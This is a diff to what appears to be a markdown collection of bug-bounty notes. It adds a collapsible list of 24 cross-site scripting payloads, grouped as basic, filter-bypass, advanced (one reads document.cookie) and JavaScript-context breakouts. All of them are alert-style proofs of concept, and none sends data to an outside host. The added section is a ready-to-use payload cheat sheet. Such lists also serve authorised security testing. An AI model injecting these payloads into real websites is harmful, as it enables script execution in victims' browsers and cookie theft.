@@ -64,6 +64,75 @@ https://domain[.]com/ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app
 [writeup_link](https://infosecwriteups.com/when-i-bypassed-google-captcha-the-epic-exploit-of-post-based-xss-csrf-1fb66f7cf886)
 
 
+----
+----
+
+
+<details>
+   <summary>XSS payloads</summary>
+
+
+XSS PAYLOADS 🔐
+
+Basic XSS Payloads (Reflected & Stored)
+
+1. "><script>alert(1)</script>  
+2. <img src=x onerror=alert(1)>  
+3. <svg/onload=alert(1)>  
+4. <script>confirm(document.domain)</script>  
+5. <body onload=alert('XSS')>  
+
+Filter Bypass Payloads
+
+6. "><scr<script>ipt>alert(1)</scr<script>ipt>  
+7. <iframe src="javascript:alert(1)"></iframe>  
+8. <math href="javascript:alert(1)">CLICK</math>  
+9. <a href="javas&#99;ript:alert(1)">Click</a>  
+10. <input autofocus onfocus=alert(1)>  
+
+Advanced and Efficient Payloads
+
+11. <img src="x" onerror=alert(document.cookie)>  
+12. <details open ontoggle=alert(1)>  
+13. <video><source onerror="alert(1)">  
+14. <svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>  
+15. <marquee onstart=alert(1)>XSS</marquee>  
+16. <form><button formaction="javascript:alert(1)">CLICK</button></form>  
+17. <link rel="stylesheet" href="javascript:alert(1)">  
+18. <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+JS Context Payloads
+
+19. ';alert(1);//  
+20. ";alert(1);//  
+21. </script><script>alert(1)</script>  
+22. javascript:alert(1)
+
+Attribute Injection Payloads
+
+23. <button onclick=alert(1)>Click</button>
+24. <a onmouseover=alert(1)>Hover me</a>
+
+ 
+</details>
+
+
+----
+----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
